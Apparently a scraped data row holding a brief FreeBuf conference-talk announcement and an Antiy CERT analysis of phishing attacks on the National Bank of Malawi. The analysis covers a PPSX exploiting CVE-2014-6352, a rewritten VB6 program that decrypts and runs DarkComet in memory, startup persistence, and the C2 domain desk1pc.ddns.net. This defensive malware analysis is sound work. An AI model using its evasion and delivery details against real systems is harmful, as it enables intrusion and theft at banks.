2019组委会充分利用优势资源，特邀斗象科技高级技术安全总监张志鹏带来《智慧运营-纵深监测与响应》的议题分享，从企业安全纵深监测与响应的视角出发，结合大数据分析、机器学习等技术，通过对应用数据的可视计算，提出安全解决方案，帮助企业构建安全智慧运营。张志鹏，斗象科技安全研究专家，曾在华为任职高级安全工程师，有多年安全测试、安全渗透及安全解决方案设计工作经验，擅长安全体系建设、安全风险评估、产品安全流程管理、项目管理等方向，目前负责斗象旗下所有品牌产品质量和行业安全研究工作。编写过金融行业安全态势报告、移动App安全报告、企业安全威胁统一应对指南等报告。熟练掌握web安全、逆向工程、安全建模分析、源码审计等技术。FIT 2019互联网安全创新大会FreeBuf互联网安全创新大会（FIT）是由国内领先的互联网安全新媒体平台FreeBuf.COM主办的年度互联网安全盛会，WitAwards互联网安全颁奖盛典也将同期举行。 FIT 2019大会会期为2018年12月12日～13日，会议将在上海宝华万豪酒店举行。本次大会主论坛议程聚焦「全球高峰会」、「前沿安全神盾局」、「WitAwards颁奖盛典」、「WIT安全创新者联盟」「X-TECH技术派对」、「HACK DEMO」六大板块，独立分设「白帽LIVE」及 「企业安全俱乐部」两大分论坛，与来自全球的安全从业者、优秀技术专家、企业安全建设者、白帽安全专家、研究机构等共同展开演讲与探讨。同时「中国首席信息安全官高峰论坛」、「漏洞马拉松线下邀请赛」也将在特色分会场同期举行。此次盛会致力于分享2018年度安全行业创新硕果，共同探索与展望未来安全新边界。&gt;&gt;&gt;【FIT 2019官网】,FIT 2019议题前瞻：智慧运营-纵深监测与响应丨CSO高峰论坛
antiylab,,2018-12-02,"前言近日，安天CERT（安全研究与应急处理中心）在梳理相关安全事件时发现多例对马拉维国民银行（National Bank of Malawi）的钓鱼邮件攻击样本。马拉维共和国（Republic of Malawi）是位于非洲东南部的内陆国家，国土面积11.8万平方公里。截至2017年9月，其全国共计人口2840万人，是非洲撒哈拉沙漠以南人口密度最高的国家之一。其国家经济长期依赖农业出口，政府常年靠举债度日，曾被联合国评为世界上最贫困的国家之一（摘自维基百科），国民银行是其国内最大的商业银行。安天通过对攻击样本和关联线索的综合分析，发现这是一系列以金融机构电子邮件为突破口，通过邮件进行交叉渗透的定向攻击事件。攻击者使用对陈旧漏洞的免杀技巧构造攻击载荷执行入口，而攻击载荷采取对多个开源代码进行改写和重新编译，将二进制远控木马加密嵌入其中，实现内存执行，达到免杀和绕过安全机制的效果。一、概述在这一系列攻击事件中，有四家马拉维国民银行的地方分行，成为攻击者的重要目标，其中大南部区（southend）官方客服邮箱已经被攻击者盗用。攻击者利用事先从国民银行部分地区分行盗取的官方邮箱口令，向其他分行工作人员发送带有恶意文档附件的邮件，作为附件的恶意文档利用CVE-2014-6352漏洞[1]发起攻击。此漏洞可以绕过“沙虫”漏洞（SandWorm）补丁MS14-060的安全保护。漏洞利用成功后，样本会执行名为“Target.scr”的可执行程序，该程序由攻击者基于开源代码[2]修改编译生成，攻击者在重写了main函数代码，程序运行时并不会调用开源代码原有的功能函数，而是内存展开执行内嵌的DarkComet远控木马，进而向目标系统发起攻击。图 1-1攻击流程示意图1.1 钓鱼邮件详情钓鱼邮件&lt;1&gt;于马拉维时间2018年10月4日（周四）上午10:43被发送到马拉维国民银行大南部区（southend）客服中心某员工所管理的官方邮箱中（可能由于地理位置紧邻和管理成本问题，大南部区（southend）客服中心并入了利隆圭（Lilongwe）地区分行）。发件人为“Yousef Syda”，是马拉维国民银行萨利马（Salima）分行的员工，初步判断该邮箱已被盗。图 1-2 钓鱼邮件&lt;1&gt;内容钓鱼邮件&lt;2&gt;于马拉维时间2018年10月4日（周四）上午10:52被发送到马拉维国民银行松巴（Zomba）分行经理Thomas Chimkowola所管理的官方邮箱&lt;zomba@natbankmw.com&gt;中，显示发件人仍为“Yousef Syda”，时间上晚于钓鱼邮件&lt;1&gt;约9分钟。图 1-3 钓鱼邮件&lt;2&gt;内容被盗邮箱Yousef Syda &lt;salima@natbankmw.com&gt;两次发信的IP地址均为185.82.***.***。图1-4 被盗邮箱的IP地址两份邮件带有同一标题“MONEY GRAM ACTION PLAN FOR OCTOBER- DECEMBER 2018（2018年10月到12月MoneyGram汇款计划）”，无正文，邮件标题字元集属性为UTF-8，并附有同一恶意文档“MONEY GRAM ACTION PLAN FOR OCTOBER- DECEMBER 2018.ppsx”，该文档使用漏洞CVE-2014-6352[1]进行攻击，该漏洞可绕过“沙虫”漏洞（SandWorm）补丁MS14-060的安全保护。在接收人双击打开ppsx文档后，其会自动开始Slide Show播放模式，触发Verb动作，执行临时目录下释放的恶意代码“Target.scr”。1.2 被攻击者信息受害者的邮箱域名natbankmw.com归马拉维国民银行所有[3]。马拉维国民银行成立于1971年，由起源于南非的标准银行（Standard Bank）和英国巴克莱银行DCO（Dominion Colonial Overseas）合并成立，现共拥有850名员工，总部坐落于马拉维的金融和商业中心布兰太尔市（Blantyre）。截至2016年12月，该银行的总资产价值为3140亿MWK（马拉维克瓦查，约合4.4亿美元），是马拉维最大的商业银行[4]。图 1-5 马拉维国民银行总部建筑(纬度：-15.8 经度：35.0)截至2018年4月，马拉维国民银行在马拉维全国维持了30多家分行，简称“客服中心”（Service Centers）。但由于银行缺乏资金和运营问题，多地“客服中心”管理混乱。2016年曾经发生巴拉卡（Balaka）地区分行的在职员工监守自盗取走上百万MWK银行存款的事件[5]。此次网络攻击事件也正是首先针对地区分行的薄弱点，盗取分行邮箱向其他分行员工发送钓鱼邮件的典型案例。图 1-6 此次攻击事件受害者之一，马拉维国民银行利隆圭（Lilongwe）分行图 1-7 此次攻击事件受害者之一，马拉维国民银行松巴（Zomba）分行图 1-8 被盗邮箱所属分行，马拉维国民银行萨利马（Salima）分行事件相关的三个邮箱皆由国民银行三个地区分行“Salima Malawi”、“Zomba Malawi”及“Lilongwe Malawi”的员工所管理，邮箱地址均可从银行官方网站客服主页上获取，被盗取的是第一位员工Yousef Syda的邮箱，可能是攻击者完成的第一个突破口。图 1-9公开在国民银行官网上的地区客服信息二、样本分析2.1 PPSX样本分析样本“MONEY GRAM ACTION PLAN FOR OCTOBER- DECEMBER 2018.ppsx”由钓鱼邮件投递，利用了著名的“沙虫”（SandWorm）漏洞补丁的绕过漏洞CVE-2014-6352[1] 。沙虫漏洞是OLE包管理INF任意代码执行漏洞，存在于Microsoft Windows服务器上的OLE包管理器，该漏洞影响Win Vista、Win7等以上操作系统，攻击者使用PowerPoint作为攻击载体。通过利用该漏洞可以在OLE打包文件（packer.dll）中下载并执行类似的INF外部文件，从而达到攻击者执行任意命令的目的。微软为沙虫漏洞发布了MS14-060补丁，但通过构造特殊的CLSID和Verb动作，该补丁可以被漏洞CVE-2014-6352绕过。之后微软再次发布MS14-064补丁针对CVE-2014-6352进行了修补。表2-1 事件中使用的ppsx样本标签图 2-1 打开后的PPSX漏洞攻击文档内容为空PPSX相关文件内容为空，没有进行相关的内容构造和伪装。解压PPSX文档可以找到“\ppt\slides\ slide1.xml”指定了嵌入OLE对象的ID为rId3。文档“\ppt\slides\_rels\ slide1.xml.rels”指定了rId3对应目录“\ppt\embeddings\”下的oleObject1.bin文件“\ppt\embeddings\oleObject1.bin”为嵌入了PE可执行程序的OLE Package对象。图 2-2 样本嵌入了包含PE的OLE对象OLE Package对象的“Olen0Native”流包含了一个完整的PE文件，流开头字符串能看出PE文件在攻击者机器上的原始保存路径“C:\Users\Analiz\Desktop\Target.scr”以及释放的路径“%TEMP%\Target.scr”。图 2-3 OLE对象包含了完整的PE数据“Target.scr”和原始保存路径信息模块packager.dll调用CPackage::Load读入该OLE Package对象时，首先调用ReadClassStg获取OLE复合文档的CLSID判断文件类型，该样本OLE对象的CLSID：{0003000c-0000-0000-00c0-000000000046}。CLSID对应OldPackage类型，因此之后依次调用CPackage::PackageReadFromStream →CPackage::EmbedReadFromStream→ CopyStreamToFile将流数据拷贝至临时目录具体文件。图 2-4 OLE对象被判断为OldPackage类型，流数据被读入图 2-5 OLE对象流数据被写入临时文件“%TEMP%\Target.scr”微软为了修补“沙虫”漏洞CVE-2014-4114，发布了补丁MS14-060[6]，在CopyStreamToFile之后增添了MarkFileUnsafe函数将该临时文件进行MOTW处理，将其Security Zone标记为不可信来源，尝试安装运行时会弹出UAC安全警告窗口[7]。图 2-6 方法CPackage::EmbedReadFromStream增添了MarkFileUnsafe标记图 2-7 “%TEMP%\Target.scr”被标记为不可信此时“%TEMP%\Target.scr”已经被释放在临时目录，如果我们以双击的方式打开该PPSX样本，自动播放模式将会开启，模块packager.dll的CPackage::DoVerb方法将检查样本指定Verb动作“cmd”的值，将其赋给变量nVerb和nTrueVerb，来决定如何处理嵌入文件“Target.scr”。这里常见的利用手法是构造“cmd”值为3，这样就能模拟popup菜单操作执行右键菜单的第二项“以管理员权限运行” [8]，最终调用SHELL32!CDefFolderMenu::InvokeCommand方法执行“Target.scr”。然而这里样本“\ppt\slides\ slide1.xml”指定Verb动作“cmd=0”，独辟蹊径采用了另一条流程。调试器中我们也看到此时nTureVerb已被赋值为0，开始执行函数CPackage::_ExecuteAttachment。进入CPackage::_ExecuteAttachment我们看到它调用了危险的CPackage::_ActivateEmbeddedFile方法，内部继续调用shdocvw!CAttachmentServices::Execute方法。图 2-8 “cmd=0”时调用了危险的CPackage::_ActivateEmbeddedFile方法shdocvw!CAttachmentServices::Execute调用_OpZoneCheck检查“%TEMP%\Target.scr”的Security Zone标记，最后调用_OpUserTrust弹出UAC安全警告窗口提醒用户选择是否执行“%TEMP%\Target.scr”：图 2-9 启动Security Zone标记检查，PPT页面弹出UAC安全警告窗口由于沙虫系列漏洞是一个链接执行漏洞，而非常见的格式文档溢出漏洞，DEP等内存安全防御机制对其无效，调高UAC的级别对类似漏洞有一定的防御效果。如果此时被攻击者选择了继续运行“Target.scr”，恶意代码将被执行。而如果被攻击者的系统关闭了UAC控制或在获取了管理员权限的情况下，该安全警告窗口将不会弹出，“Target.scr”会被静默无警告地执行。注：关于“沙虫”漏洞和其绕过漏洞CVE-2014-6352的更多细节可以参考安天[8]和360天眼实验室[9]及McAfee[10]的分析文章。2.2 Target.scr样本分析Target.scr样本伪装成屏幕保护程序，由Visual Basic 6.0编写且未加壳，基本信息见表2-2：表2-2 Target.scr样本标签通过反编译分析发现该样本的原始文件描述为”Gate Pass Management System (Klash (Pvt) Ltd.)”：图 2-10 样本反编译后显示描述“Gate Pass Management System”样本反编译代码的更多部分是并不能被调用的各种数据库操作功能函数，以及大量的数据库操作语句。这些数据库功能代码和语句能够连接数据库并对管理账户和库存记录进行增删改查。例如函数AddNewIGPass()和DeleteIGPass()能通过SQL语句操作“tblIGMaster”和“tblIGDetails”表，新增和删除库存记录：图 2-11 通过“INSERT”和“DELETE”语句增删库存记录表2-3 部分数据库被操作表名和操作语句一览通过安天同源分析系统的比对，我们找出了对应的开源代码[2] ，根据项目描述，这份代码适用于公司的库存管理系统：图 2-12 该Visual Basic项目的描述（这份代码适用于公司的库存管理系统）该项目开发者是“Muhammad Assir Nadeem”，是巴基斯坦境内服装业公司Klash Private Limited的IT经理，根据我们的综合分析，没有理由怀疑该公司和项目开发者与攻击事件有关：图 2-13 “IGOG Gate Pass System”开发者的个人介绍攻击者并未利用开源代码中的任何功能调用，而是将加密后的DarkComet远控木马作为一个数据块嵌入到相关代码中，通过修改Main函数Main_441770()的代码将木马运行起来，而开源代码的相关功能都不会被执行。关于使用正常数据库管理客户端源码进行修改的目的，根据2.3小节更多关联样本的分析，可以认为这是一种具有迷惑性的免杀方式。函数Main_441770()的修改主要是为了进行两个动作：其一是实现将%TEMP%目录下的文件“Target.scr”复制一份至启动目录下，在主机侧建立持久化：文件路径：“%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\patakia.exe”图 2-14 复制自身至启动目录下“patakia.exe”“patakia.exe”的文件相关Version信息等，同公开的源码完全符合：图 2-15 文件“patakia.exe”的描述其二是实现解密资源节中存放的恶意代码并运行。样本在原有库管理客户端源码的基础上修改了执行逻辑，实际运行过程中解密运行资源节嵌入了加密的Darkcomet远控木马。“DarkComet RAT”又称“暗黑彗星”木马，具有远程操控、击键记录、摄像头监控、文件窃取和DDoS攻击等诸多丰富功能，是黑产活动中非常常见的木马类别。由于原有开源代码中的功能代码不会被调用执行，加之其文件拷贝的位置并不在对应的程序目录下，这基本排除掉了攻击者是为了替换原有主机环境的IT工具来建立持久化入口的猜测 样本“patakia.exe”的资源节（ID=109处）包含了32,219字节的垃圾数据和276,995字节的加密数据（以[++...--...+]为标志头）：图 2-16资源节ID=109处包含的加密数据加密数据会在内存中被加载、解密，并展开成一个完整的Darkcomet木马PE文件：图 2-17从资源节ID=109加载由标志头开始的数据图 2-18从内存中dump出的PE包含典型Darkcomet木马特征木马尝试反向连接攻击者C&amp;C服务器（desk1pc.ddns.net:700），其当前解析IP185.82.***.***即为两封钓鱼邮件的发信IP，可以认为攻击者掌控的资源相对有限。图2-19 TCP请求中包含的“KEEPALIVE+数字”用以维持同C&amp;C的网络连接2.3 扩线分析根据本报告1.1节中的相关信息扩线可以找到其他一些手法如出一辙、攻击目标皆为银行的恶意邮件。但其并非从马拉维银行工作人员的信箱发出，而是盗用了其他金融机构的员工信箱，且邮件的发信方来自同一台攻击者主机。其中一封信的收信人是马拉维国民银行的纳卡洛（nchalo）分行。时间最早的一封邮件通过被盗邮箱Justin Akwuasaba发送，该被盗邮箱系加拿大皇家银行（Royal Bank of Canada）的员工工作信箱。发信时间为“2018年6月22日（周五）22:03”，发信IP为“185.82.***.***”，同1.1节中的发信IP 185.82.***.***属同一C段。该恶意邮件还发送给了马拉维国民银行的另一待攻击目标nchalo，其为马拉维国民银行纳卡洛（nchalo）分行的官方联系邮箱。图 2-20 马拉维国民银行nchalo分行收到的攻击邮件在攻击邮件中也有其他国家的银行目标，如其中一封邮件发送自邮箱“Audit Dept mgmt@prabhugroupusa.com”，系美国大型金融服务（银行间汇款转账）公司“Prabhu” [11]的员工工作邮箱。发信时间为“2018年8月25日（周六） 10:19”，发信IP为“185.82.***.***”，与上述第一封邮件的发信IP一致。收信邮箱yenisey.salahov@ibar.az系阿塞拜疆国际银行（The International Bank of Azerbaijan）员工工作邮箱。图 2-21 阿塞拜疆国际银行收到的同类攻击邮件这两封邮件的两个PPSX文件附件与1.1节中描述的样本一样，都利用了CVE-2014-6352漏洞，OLE对象的“Ole10Native”流都包含了完整PE数据（“Document.scr”、“Document.exe”），原始保存路径则出现了新的路径“C:\Users\kboy\”。Verb动作也都设置为“cmd=0”以执行临时目录下释放的绑定了恶意代码的正常程序。图 2-22 释放的PE复制至启动目录后的文件名样本“Document.scr”和“Document.exe”同2.2节中的“Target.scr”构造手法完全一致，它们分别在开源程序“Tech2ks NComputing Caffe[12]”和国际象棋游戏“ChessQuest”的源代码中插入DarkComet木马，甚至连木马的回连C2都共用着同一个域名和端口：“desk1pc.ddns.net:700”。以样本“Document.exe”为例，同2.2节中的样本“Target.scr”进行特征比对能展示出更多相似之处：表2-4拓线样本特征对比通过检查185.82.***.***~***这一段IP，我们发现IP 185.82.***.***和185.82.***.***于今年10月初曾被用于上文的三个Visual Basic样本和其它远控木马作回传C&amp;C服务器（皆绑定过临时二级域名kango.ddns.net、kinging.ddns.net、segun.ddns.net和desk1pc.ddns.net）。而IP 185.82.***.***则于今年10月初被用于挂载知名勒索软件GandCrab。通过扩线分析可以看出，攻击者使用了多种公开源码程序作为掩护传播恶意代码，由于源程序代码并不能正常运行，而且所使用的开源程序并非常见金融场景下的应用或工具软件，所以我们认为攻击者并不是替换用户原有程序来实现持久化，而是以此作为免杀和干扰分析的技巧。三、小结从已有信息来看，本次马拉维国民银行及其他多国金融机构遭受的网络攻击均使用同一手法，这一系列网络攻击初步判断是以金融机构为目标，以金融资产侵害为目的的犯罪行为。目前除能判断马拉维银行相关信箱已被入侵并作为攻击跳板外，目前尚无法判断和知晓事件相关的几家分行客服员工是否已经触发攻击流程而造成了实际的损失。综合攻击者使用的漏洞、载荷、地址资源、社工技巧来看，系由一定技术能力的个人攻击者或犯罪团伙的可能性较大。金融机构的运行高度依赖于信息系统，传统金融机构更多依靠物理空间安全手段保证信息系统安全。但在互联网时代，由于为大量互联网用户提供服务以及银行间跨国汇兑转账等业务，金融机构的信息系统已经是一个事实上存在着互联网侧多暴露面的系统。金融系统的服务网站、网银接口、人员使用的工作电子邮件信箱、跨行转账服务等，在已有攻击事件中，成为攻击的入口。尤其金融机构的电子邮件由于是直接暴露的信息资产，极易成为攻击者的攻击入口，同时因为其中的员工邮箱遭受攻击后，容易在内部实现基于邮件信任链的攻击，导致连锁反应的发生。和安天既往复盘分析的针对金融机构的其他攻击——如针对在孟加拉国央行、越南先锋银行等多国SWIFT系统的网络攻击事件相比，本事件属于低水平攻击事件。攻击者并未使用0day漏洞，其攻击载荷也并无数字签名盗用等方式伪装，属于在基础结构安全和纵深防御层面可以有效对抗遏制的攻击。如果相关金融机构实施严格的安全策略，做好补丁升级和配置加固等基本工作，配套部署具有主动防御能力的终端防御软件并保持更新升级，就可以大大降低相关载荷的执行概率。本事件客观上代表了部分经济不发达国家的金融机构处于较低的防护水平之中，网络安全投入能力相对较差，本身抵御风险的能力也不足。网络攻击带来的风险，有可能转化为国家级的金融灾难。我国当前整个金融信息化发展水平较快，在网络安全防护方面也积累了大量模式和经验，但同时也面临着更高的安全风险，需要应对超高能力国家/地区威胁行为体所发动的网络攻击。这些行为体具有坚定的攻击意志、能够承担巨大的攻击成本。在大规模工程体系的支撑下，进行体系化的攻击作业。TAO组织攻击中东的最大SWIFT服务机构就是其中的代表事件。防御这一层面的网络攻击，需要以能力导向建设，按照“综合发展、深度结合、全面覆盖、动态综合”的安全理念，形成高水平的防御能力。在这个过程中，中国的能力型安全厂商，不仅要做好当下，也要逐步放眼全球，与中国金融机构共同积累沉淀安全防护理念、经验和解决方案，在未来对经济不发达国家的金融机构实现网络安全能力的支持和援助。四、参考资料[1]CVE: CVE-2014-6352https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6352[2]Freesourcecode：Gate Pass Management System in Visual Basichttp://freesourcecode.net/vbprojects/21006/Gate-Pass-Management-System–in-Visual-Basic#.W8PphtlR2Ht[3] Natbankmw：马拉维银行官网https://www.natbankmw.com[4]维基百科：National_Bank_of_Malawihttps://en.wikipedia.org/wiki/National_Bank_of_Malawi[5]Malawi24：workers-steal-millions-from-national-bankhttps://malawi24.com/2016/02/09/workers-steal-millions-from-national-bank/[6]微软：Microsoft Security Bulletin MS14-060 – Importanthttps://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-060[7]微软：Microsoft TechNethttps://technet.microsoft.com/en-us/ms537628(v=VS.71)[8]安天：沙虫（CVE-2014-4114）相关威胁综合分析报告http://www.antiy.com/response/cve-2014-4114.html[9]Freebuf：CVE-2014-6352漏洞及定向攻击样本分析http://www.freebuf.com/vuls/106853.html[10]McAfee：Bypassing Microsoft’s Patch for the Sandworm Zero Day: Even ‘Editing’ Can Cause Harmhttps://securingtomorrow.mcafee.com/mcafee-labs/bypassing-microsofts-patch-for-the-sandworm-zero-day-even-editing-can-cause-harm/[11]Prabhu:about ushttps://www.prabhuonline.com/information/why-us[12]Freesourcecode：Tech2ks NComputing Caffe in Visual Basic较新版本http://freesourcecode.net/vbprojects/17691/Tech2ks-NComputing-Caffe-in-Visual-Basic#.W_vKmLEzZaQ*本文作者：antiylab，转载请注明来自FreeBuf.COM",针对马拉维(MALAWI)国民银行的网络攻击样本分析报告
